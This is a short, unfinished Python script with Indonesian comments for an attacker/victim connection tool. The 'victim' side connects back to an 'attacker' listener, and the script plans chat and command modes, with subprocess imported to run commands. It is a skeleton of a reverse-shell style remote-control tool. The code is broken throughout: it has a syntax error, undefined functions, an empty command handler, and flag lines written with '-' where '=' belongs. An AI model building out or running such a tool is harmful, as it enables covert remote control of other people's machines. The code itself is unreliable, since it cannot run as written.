# mengambil argumen
from getopt import getopt
import sys
# untuk chat
from threading import Thread
# untuk menjalankan command
import subprocess
# untuk chdir dkk lebih untuk download
import os
# untuk socket
import socket

IP = ""
PORT = -1
LISTENER = False
CHAT = False


def check_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except:
        return False


def attacker_send_chat(con):
    while True:
        try:
            message = input("Message to send: ")
            if message == "exit":
                con.close()
                break
            elif message != "":
                con.send(message.encode())
        except:
            break


def attacker_chat(con):
    send_thread = Thread(target=attacker_send_chat, args=(con,))
    recv_thread = Thread(target=attacker_recv_chat, args=(con,))


def attacker_command(con):
    pass


def attacker():
    attacker_socket = socket.socket()

    attacker_socket.bind((IP, PORT))
    attacker_socket.listen(1)
    print("Attaccker is listneing...")
    con, (ip, port) = attacker_socket.accept()
    print("Connected with victim at {ip:port}")

    if CHAT:
        attacker_chat(con)
    else:
        attacker_command(con)

    attacker_socket.close()
    print("program is closed")


def victim():
    victim _socket = socket.socket()

    victim_socket.connect((IP, PORT))

    if CHAT:
        victim_chat(victim_socket)
    else:
        victim_response(victim_socket)

    victim.socket.close()


def process():
    if LISTENER:
        attacker()
    else:
        victim()


def main():
    global IP, PORT, LISTENER, CHAT  # penting untuk assign value
    # l sama c tidak menggunakan value karena kita ingin tahu dia true atau false
    opts, _ = getopt(sys.argv[1:], "i:p:lc", [
                     "ip=", "port=", "listener", "chat"])

    for key, value in opts:
        # if key == "--i" or key == "--ip": bisa menggunakan ini
        if key in ["-i", "--ip"]:
            IP = value
        elif key in ["-p", "--port"]:
            PORT = int(value)
        elif key in ["-l", "--listener"]:
            LISTENER - True
        elif key in ["-c", "--chat"]:
            CHAT - True
    if check_ip(IP) and PORT > 0 and PORT < 65535:
        process()
    else:
        print("invalid")


if __name__ == "__main__":
    main()
